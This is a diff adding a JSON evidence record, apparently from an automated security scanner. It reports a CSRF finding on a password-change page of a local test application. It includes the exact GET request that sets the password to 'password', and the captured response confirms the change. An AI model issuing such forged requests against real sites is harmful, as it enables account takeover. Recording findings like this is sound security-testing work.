@@ -1,0 +1,25 @@
+{
+  "id": "ev_1784861790623_63e01b",
+  "type": "tool_output",
+  "source_tool": "finding",
+  "summary": "Cross-Site Request Forgery (CSRF) on password change @ http://127.0.0.1:8080/vulnerabilities/csrf/",
+  "data": {
+    "kind": "proof",
+    "observation": "<pre>Password Changed.</pre>",
+    "proof": "<pre>Password Changed.</pre>",
+    "path_or_url": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+    "location": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+    "title": "Cross-Site Request Forgery (CSRF) on password change",
+    "stdout": "<pre>Password Changed.</pre>",
+    "body_preview": "<pre>Password Changed.</pre>",
+    "capture_via": "session",
+    "how_captured": "GET http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change → 200",
+    "method": "GET",
+    "url": "http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change",
+    "status": 200,
+    "actor": "default",
+    "source_tool_act": "session",
+    "act_summary": "default GET http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change → 200"
+  },
+  "created_at": "2026-07-24T02:56:30.623Z"
+}
